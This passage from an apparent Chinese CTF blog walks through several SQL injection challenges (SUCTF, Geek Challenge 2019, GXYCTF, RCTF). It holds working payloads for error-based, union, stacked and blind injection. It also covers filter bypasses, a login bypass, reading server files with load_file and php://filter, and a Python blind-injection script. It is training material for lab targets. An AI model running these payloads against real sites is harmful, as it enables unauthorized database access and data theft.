<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;数据库</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;表名</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema&#x3D;&#39;ctfusers&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;字段</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name&#x3D;&#39;user&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;数据</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;05e89701-1f01-4719-965c-3d59d7e0f664&#125;</span><br></pre></td></tr></table></figure>
<h2 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,SUBSTR((SELECT f14g from f14g LIMIT 0,1),1,24),0x7e),1) # 最多显示32位，需要配合substr使用</span><br></pre></td></tr></table></figure>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php # 以base64方式读取指定页面源码</span><br></pre></td></tr></table></figure>
<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>来源：SUCTF2019</p>
<p>考察：堆叠注入，sql_mode</p>
<p>参考：<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/105241226%EF%BC%8Chttps://my.oschina.net/u/4413091/blog/3384385">https://baynk.blog.csdn.net/article/details/105241226，https://my.oschina.net/u/4413091/blog/3384385</a></p>
<p><strong>第一步</strong></p>
<p>先用fuzz字典进行测试，发现大部分关键字被过滤（select，and，双引号等）</p>
<p>但是分号;没过滤</p>
<p><strong>第二步</strong></p>
<p>然后进行下面尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1; show tables;</span><br></pre></td></tr></table></figure>
<p>均可获得答案，且知道当前table为flag</p>
<p>但是尝试以下语句时失败，因为flag和from被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; show flag from flag;</span><br></pre></td></tr></table></figure>
<p><strong>第三步</strong></p>
<p>但是考虑到提交1时，是由返回结果的，猜测后台语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;] | xxx from flag; # xxx就是[0] &#x3D;&gt; 1，因为不论提交什么数字都得到同一个答案</span><br></pre></td></tr></table></figure>
<p>要绕过这个语句有两种方法</p>
<p><strong>payload1</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1|2 from flag</span><br></pre></td></tr></table></figure>
<p>即提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
<p><strong>payload2</strong></p>
<p>修改sql_mode，使||被视为连接符，而不是逻辑或</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
<p><strong>第四步</strong></p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e8aa1999-1dbc-4b3f-86d9-b961ff44cf09&#125; </span><br></pre></td></tr></table></figure>
<h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">参考 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;piperck&#x2F;p&#x2F;9835695.html</span><br><span class="line"></span><br><span class="line">查看当前连接会话的sql模式：</span><br><span class="line">mysql&gt; select @@session.sql_mode;</span><br><span class="line">或者从环境变量里取</span><br><span class="line">mysql&gt; show variables like &quot;sql_mode&quot;;</span><br><span class="line"></span><br><span class="line">查看全局sql_mode设置：</span><br><span class="line">mysql&gt; select @@global.sql_mode;</span><br><span class="line"></span><br><span class="line">只设置global，需要重新连接进来才会生效</span><br><span class="line"></span><br><span class="line">设置形式如</span><br><span class="line">mysql&gt; set sql_mode&#x3D;&#39;&#39;;</span><br><span class="line">mysql&gt; set global sql_mode&#x3D;&#39;NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&#39;;</span><br></pre></td></tr></table></figure>
<p>知道就好，具体的sql_mode太多</p>
<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>题目来源：极客大挑战2019</p>
<p>考察：万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2d7e92c3-eed8-407e-9763-0a66581f2030&#125;</span><br></pre></td></tr></table></figure>
<h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><p>来源：极客大挑战2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/107991185">https://blog.csdn.net/vanarrow/article/details/107991185</a></p>
<p>考察：报错注入</p>
<p><strong>错误尝试</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello admin！</span><br><span class="line"></span><br><span class="line">Your password is &#39;c2f1e24e0e83d0373e5bbe94c3168506&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;c2f1e24e0e83d0373e5bbe94c3168506&#39; and &#39;1&#39;&#x3D;&#39;1   #Login Success</span><br></pre></td></tr></table></figure>
<p>均失败</p>
<p>根据wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39;#&amp;password&#x3D;1 # 提示input your name and password，说明语句大概为 select xxx from database where username&#x3D;&#39;$_GET[username]&#39; and password&#x3D;&#39;$_GET[password]&#39;</span><br><span class="line">?username&#x3D;1&amp;password&#x3D;12&#39; or &#39;1&#39;&#x3D;&#39;1 # 验证上一条结论，需要从username处进行注入</span><br></pre></td></tr></table></figure>
<p><strong>注意，这里有个坑。若直接在输入框填写#，在URL会被解释成%23。而在firefox的hackbar中填写#，是不会被识别成sql语句中的注释符的</strong></p>
<p>此处必须在username进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39; order by 4 %23&amp;password&#x3D;1 </span><br><span class="line"># 报错</span><br><span class="line"></span><br><span class="line">username&#x3D;1&#39; union select 1,2,3 %23&amp;password&#x3D;1</span><br><span class="line"># 显示2,3。因此2和3是注入位</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,database(),2 %23&amp;password&#x3D;1</span><br><span class="line"># 显示geek，为数据库名</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;),2 %23&amp;password&#x3D;1</span><br><span class="line"># 显示geekuser,l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;geekuser&#39;%23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;id,username,password&#39;</span><br><span class="line"># 查看表内容，没有flag，转而查看l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39; %23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;id,username,password&#39;</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 %23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;8e0fc55e-8d36-4db0-a48e-7e2a57fea0c9&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>根据花括号，得到flag</p>
<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>在Hackbar中，若以get方式提交sql语句，需要注意转码问题。比如空格为+，#为%23等</p>
<h1 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h1><p>来源：极客大挑战2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL</a></p>
<p>考察：双写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; order by 1 %23&amp;password&#x3D;1</span><br><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;der 1 #&#39; and password&#x3D;&#39;1&#39;&#39; at line 1</span><br><span class="line">select x,y,z from db where username&#x3D;&#39;username&#39; and password&#x3D;&#39;password&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据wp，可以双写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;123&#39; ununionion seselectlect 1,database(),3%23&amp;password&#x3D;bbyy</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23&amp;password&#x3D;123</span><br><span class="line"># 显示 b4bsql,geekuser</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39; %23&amp;password&#x3D;123</span><br><span class="line"># 显示 id,username,password</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(passwoorrd) ffromrom b4bsql %23&amp;password&#x3D;123</span><br><span class="line"># 显示&#39;i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag&#123;389fb140-395f-4f93-9137-fea88d9947b5&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h1><p>来源：极客大挑战2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12257412.html">https://www.cnblogs.com/wangtanzhi/p/12257412.html</a></p>
<p>考察：xpath报错注入</p>
<p><strong>自己做的部分</strong></p>
<p>发现很多常用字会报错，因此fuzz跑了一下（此处需要一个好词典，搜集的词典有点坑爹）</p>
<p>结果union和and、空格都被过滤</p>
<p>空格过滤可以用以下形式执行sql语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(*)from(db)</span><br></pre></td></tr></table></figure>
<p><strong>以下为参考部分</strong></p>
<p>发现报错注入的updatexml没过滤，尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># 返回XPATH syntax error: &#39;~geek~&#39;</span><br></pre></td></tr></table></figure>
<p>之后操作类似</p>
<p>执行到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># flag&#123;582fda48-ebec-495e-acda-7</span><br></pre></td></tr></table></figure>
<p>只出现了一半的flag，而substr被过滤</p>
<p>根据wp，使用left和right进行拼接操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;123</span><br><span class="line"># 8-ebec-495e-acda-76d8e7055dec&#125;</span><br></pre></td></tr></table></figure>
<p>也可以使用reverse函数，自然把右半边的显示出来了</p>
<h1 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h1><p>来源：极客大挑战2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/13026698.html">https://www.cnblogs.com/hello-there/p/13026698.html</a></p>
<p>考察：异或注入</p>
<p>首先Fuzz测试，发现过滤了大部分字段</p>
<p>其次访问页面中的五个标题，发现URL上会有id字段的变化。而访问[1,6]之外的id值时，会提示ERROR。推理处此处可布尔注入</p>
<p>由于FUZZ中if被过滤，用异或符^代替if</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fb37a3d0-7d7e-44ae-8436-df42f39c93a3.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;Not this!&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 31</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		# s &#x3D; &quot;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		s &#x3D; &quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid)</span><br><span class="line">		# print(s)</span><br><span class="line">		# print(url+s)</span><br><span class="line">		response &#x3D; requests.get(url+s)</span><br><span class="line">		# print(response.text)</span><br><span class="line">		if &quot;ERROR&quot; in response.text:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">		else:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">	if low &#x3D;&#x3D; 31 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans +&#x3D; chr(low)</span><br><span class="line">	print(ans)</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"># if(substr(select(flag)from(flag),&#123;&#125;,1)&#x3D;&#123;&#125;,1,2)</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>




<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6103d756-d25b-48b2-bf23-940081a321df&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BabySQli1"><a href="#BabySQli1" class="headerlink" title="BabySQli1"></a>BabySQli1</h1><p>来源：GXYCTF2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/shangguanchanghong/p/13805558.html">https://www.cnblogs.com/shangguanchanghong/p/13805558.html</a></p>
<p>考察：大小写绕过，后台语句猜测</p>
<p>Fuzz测试，可以看到admin’提示sql错误，有单引号注入；左括号，右括号，等号，or，ord，order，information_schema.tables，concat_ws，xor等被过滤</p>
<p>查看网页源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
<p>根据<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a><br>base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>明显，那段文字是base32加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
<p>大小写绕过，得到列数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; Or 1 Order by 3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;admin&#39; Or 1 Order by 4 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
<p>测试name为哪一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select &#39;admin&#39;,2,3 #&amp;pw&#x3D;admin</span><br><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,3 #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>
<p>第二个提示pass错误，说明admin放在第二行</p>
<p>注意此处admin需要用单引号括起来，在sql语句中会被解释为字符串，而不是某个列名</p>
<p>wp说，一般后台都会用md5计算密码hash值并存储，所以猜测后端源码是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name &#x3D; $_POST[&#39;name&#39;];</span><br><span class="line">$passwd &#x3D; md5($_POST[&#39;pw&#39;]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select * from user where username &#x3D; &#39;$name&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line"></span><br><span class="line">if (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo(&quot;Wrong Pass&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以password为pw的值的md5值即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;a&#39; union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39; #&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d69a01fe-e2ac-4330-b89a-d2ff0f6bcac0&#125; </span><br></pre></td></tr></table></figure>
<h1 id="EasySQL-2"><a href="#EasySQL-2" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>来源：RCTF2015</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#GXYCTF2019-BabysqliV1</a></p>
<p>考察：报错注入，sql的reverse函数，sql的regexp函数</p>
<p>注册+登录+修改密码，算是模板题</p>
<p>因为登录后可以显示用户名，初步判断在用户名处注入</p>
<p>分别注册用户zz’和zz”，zz”在修改密码时报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;zz&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>反过来判断语句大致为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zz&quot; and and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39; # 后面这个应该是md5值</span><br></pre></td></tr></table></figure>
<p>那么之后就xpath注入即可</p>
<p>注意本题过滤了or，substr，多余的空格，异或符^</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zz&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p><del>web_sqli</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;web_sqli&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p><del>article,flag,users</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>~name,pwd,email,real_flag_1s_her</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;|(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>‘~ereh_s1_galf_laer,liame,dwp,ema’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p>
<p>尝试reverse</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1))#</span><br></pre></td></tr></table></figure>
<p>‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p>
<p>使用regexp进行正则匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>‘~flag{8ab20865-f566-4f30-a861-10’</p>
<p>reverse一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e)),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>‘~}5cdb11ddaa01-168a-03f4-665f-56’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8ab20865-f566-4f30-a861-10aadd11bdc5&#125;</span><br></pre></td></tr></table></figure>




<h1 id="EzSqli"><a href="#EzSqli" class="headerlink" title="EzSqli"></a>EzSqli</h1><p>来源：GYCTF2020</p>
